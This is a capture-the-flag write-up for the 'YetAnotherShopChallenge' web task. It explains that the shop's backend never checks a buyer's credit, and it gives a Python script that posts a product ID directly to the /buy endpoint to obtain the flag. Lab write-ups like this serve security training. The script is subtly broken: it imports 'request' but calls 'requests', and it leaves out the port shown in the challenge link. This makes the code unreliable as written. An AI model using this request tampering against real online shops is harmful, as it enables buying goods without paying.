# CyberChallenge.IT 2024 - University CTF

## [web] YetAnotherShopChallenge (131 solves)

Site: [http://yasc.challs.external.open.ecsc2024.it:38208](http://yasc.challs.external.open.ecsc2024.it:38208)

Author: Lorenzo Leonardini <@pianka>

## Solution

YASC is an online shop. The shop sells different items, among these items there's the flag.

The user doesn't have enough credit to buy the flag. However, it's just the frontend that doesn't allow to buy too expensive items, the backend has no checks for it. For this reason, we can send a request directly to the backend to buy the flag:

```py
import request

# the session is required in order to have some credit balance
session = requests.Session()
session.get('http://yasc.challs.external.open.ecsc2024.it')

res = session.post('http://yasc.challs.external.open.ecsc2024.it/buy', data={'product_id': '43d27d66-150b-4b41-a1ee-6c3e02c0a67c'})
print(res.text)
```

Alternatively, we can intercept and edit from Burp the request to buy another item.
